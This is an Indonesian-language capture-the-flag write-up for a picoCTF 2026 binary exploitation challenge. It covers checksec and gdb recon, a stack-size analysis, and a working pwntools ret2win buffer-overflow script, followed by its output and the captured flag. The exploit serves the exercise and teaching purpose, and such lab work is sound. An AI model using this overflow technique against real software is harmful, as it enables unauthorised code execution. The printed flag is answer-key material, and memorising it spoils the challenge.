# picoCTF2026-Echo-Escape1.md

yo how r u guys, welcome back to my write up

pada challenge kali ini aku menantang diriku sendiri untuk mengerjakan ini tanpa mendownload file source code nya. namun aku bisa menggunakan tools yang kupunya untuk mendapatkan informasi mengenai challnya. 
jadi intinya challenge ini memberikan file source c dan file program elf x86-64 yang akan menanyai nama. tujuan kita disini adalah mendapatkan flag dengan melompat ke fungsi win yang bahkan tidak dipanggil samasekali
oleh alur program biasa.

# recon
hal yang menarik di binary exploitation adalah proses mencari informasinya. mari kita coba lihat file nya secara detail.
```
┌──[reno@cybersec]──[~/ctf/pwn/echo-escape1]
└[]> file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ea8d17256f06912c64bebf47f9ecf5a141aada81, for GNU/Linux 3.2.0, not stripped
┌──[reno@cybersec]──[~/ctf/pwn/echo-escape1]
└[]> pwn checksec vuln
[*] '/home/reno/ctf/pwn/echo-escape1/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
┌──[reno@cybersec]──[~/ctf/pwn/echo-escape1]
└[]> ./vuln
Welcome to the secure echo service!
Please enter your name: ambatucamp
Hello, ambatucamp
&�u
Thank you for using our service.
```

dari recon singkat ini kita sudah dapat beberapa informasi penting:

- proteksi canary dan pie mati (membuat program ini menjadi sasaran empuk buffer overflow dan ret2win)


selanjutnya ,mari kita cari apakah ada fungsi yang berguna untuk kita, aku disini pakai gdb.
```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010d0  putchar@plt
0x00000000004010e0  puts@plt
0x00000000004010f0  fread@plt
0x0000000000401100  fclose@plt
0x0000000000401110  printf@plt
0x0000000000401120  read@plt
0x0000000000401130  fflush@plt
0x0000000000401140  fopen@plt
0x0000000000401150  perror@plt
0x0000000000401160  fwrite@plt
0x0000000000401170  _start
0x00000000004011a0  _dl_relocate_static_pie
0x00000000004011b0  deregister_tm_clones
0x00000000004011e0  register_tm_clones
0x0000000000401220  __do_global_dtors_aux
0x0000000000401250  frame_dummy
0x0000000000401256  win
0x00000000004012fb  main
0x0000000000401380  __libc_csu_init
0x00000000004013f0  __libc_csu_fini
0x00000000004013f8  _fini
```

jelas sekali disini ada target kita yaitu fungsi win. namun yang perlu kita lihat pertama adalah fungsi main. karena kita harus tau dulu alur programnya gimana.
```
pwndbg> disas main
Dump of assembler code for function main:
   0x00000000004012fb <+0>:     endbr64
   0x00000000004012ff <+4>:     push   rbp
   0x0000000000401300 <+5>:     mov    rbp,rsp
   0x0000000000401303 <+8>:     sub    rsp,0x20
   0x0000000000401307 <+12>:    lea    rdi,[rip+0xd22]        # 0x402030
   0x000000000040130e <+19>:    call   0x4010e0 <puts@plt>
   0x0000000000401313 <+24>:    lea    rdi,[rip+0xd3a]        # 0x402054
   0x000000000040131a <+31>:    mov    eax,0x0
   0x000000000040131f <+36>:    call   0x401110 <printf@plt>
   0x0000000000401324 <+41>:    mov    rax,QWORD PTR [rip+0x2d4d]        # 0x404078 <stdout@@GLIBC_2.2.5>
   0x000000000040132b <+48>:    mov    rdi,rax
   0x000000000040132e <+51>:    call   0x401130 <fflush@plt>
   0x0000000000401333 <+56>:    lea    rax,[rbp-0x20]
   0x0000000000401337 <+60>:    mov    edx,0x80
   0x000000000040133c <+65>:    mov    rsi,rax
   0x000000000040133f <+68>:    mov    edi,0x0
   0x0000000000401344 <+73>:    call   0x401120 <read@plt>
   0x0000000000401349 <+78>:    lea    rax,[rbp-0x20]
   0x000000000040134d <+82>:    mov    rsi,rax
   0x0000000000401350 <+85>:    lea    rdi,[rip+0xd16]        # 0x40206d
   0x0000000000401357 <+92>:    mov    eax,0x0
   0x000000000040135c <+97>:    call   0x401110 <printf@plt>
   0x0000000000401361 <+102>:   lea    rdi,[rip+0xd10]        # 0x402078
   0x0000000000401368 <+109>:   call   0x4010e0 <puts@plt>
   0x000000000040136d <+114>:   mov    eax,0x0
   0x0000000000401372 <+119>:   leave
   0x0000000000401373 <+120>:   ret
```
seperti biasa, asembly itu mengerikan wkwkwkkwwk. tapi tenang aja aku akan ambil bagian pentingnya aja
```
   0x0000000000401300 <+5>:     mov    rbp,rsp
   0x0000000000401303 <+8>:     sub    rsp,0x20 <- ukuran stack : 32
lalu
   0x0000000000401337 <+60>:    mov    edx,0x80 <- input hingga : 128
   0x000000000040133c <+65>:    mov    rsi,rax
   0x000000000040133f <+68>:    mov    edi,0x0
   0x0000000000401344 <+73>:    call   0x401120 <read@plt>
```
kalau diperhatikan seksama, di awal program membuat stack dengan ukuran 0x20 atau sekitar 32 byte. lalu pada main+60 kebawah, program melakukan read input user, namun ukuran read tersebut adalah 0x80 atau 128 byte

karena input kita bisa hingga 128 byte sedangkan ukuran stack hanya 32. maka kita bisa melakukan buffer overflow pada program ini dan menimpa return address agar program pergi ke fungsi yang kita inginkan.

jika ingin melihat stack kurang lebih bentuknya gini
```
+-------------------------------------------------------+  
| Argumen Fungsi dari Pemanggil (Caller Arguments)      |
+-------------------------------------------------------+
| Saved Return Address (RIP)  <-- [rbp + 0x8]           |  <--- target kita disini
+-------------------------------------------------------+
| Saved Frame Pointer (RBP)   <-- [rbp + 0x0]           |
+-------------------------------------------------------+
| Variabel Lokal / Buffer     <-- [rbp - 0x20]          |  <--- input start disini
+-------------------------------------------------------+ 
```

jadi kita isi dulu stack hingga penuh lalu setelah stack penuh dan input kita mulai tumpah tinggal diisi dengan alamat fungsi win. saya bisa membuat skrip sederhana untuk mengeksploitnya. oh iya
jangan lupa membuat file flag.txt secara local untuk keperluan debugging

code python:
```
from pwn import *


elf = ELF('./vuln')

winaddr = p64(elf.sym.win)
padding = b"A"*40 # 32 ->padding + 8->saved rbp-0x0 
payload = padding + winaddr

io = process('./vuln')
io.sendline(payload)
io.interactive()
```
lah kenapa paddingnya diisi 40? kan ukuran stacknya cuman 32. nah jadi tujuan kita kan rip / return address. sementara jarak antara stack ke return address itu gak murni 32. karena diantara stack dengan return addess
itu ada ssaved rbp. bisa diliar lagi gambar stack diatas, nah jika di file elf 64 bit ukuran saved rbp itu 8 byte, maka 32 + 8 = 40 .itulah byte yang kita butuhkan untuk menimpa return address.
```
┌──[reno@cybersec]──[~/ctf/pwn/echo-escape1]
└[]> python3 exploit.py
[*] '/home/reno/ctf/pwn/echo-escape1/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './vuln': pid 5453
[*] Switching to interactive mode
Welcome to the secure echo service!
Please enter your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV\x12@
Thank you for using our service.
flag{fake_flag}

[*] Got EOF while reading in interactive
$
```
udah dapet nih , tinggal ubah target dari program langsung ke server picoctf nya.

```
┌──[reno@cybersec]──[~/ctf/pwn/echo-escape1]
└[]> python3 exploit.py
Welcome to the secure echo service!
Please enter your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV\x12@
Thank you for using our service.
picoCTF{3ch0_s3rv1c3_br34k5_22f4ab1e}$
```
and voila~
flag = **picoCTF{3ch0_s3rv1c3_br34k5_22f4ab1e}**

jadi sangat penting untuk mempelajari struktur stack agar kita bisa tahu dimana target kita berada, apalagi jika akan ada canary. mungkin akan sedikit merepotkan jika belum menguasai fundamental dari ini.
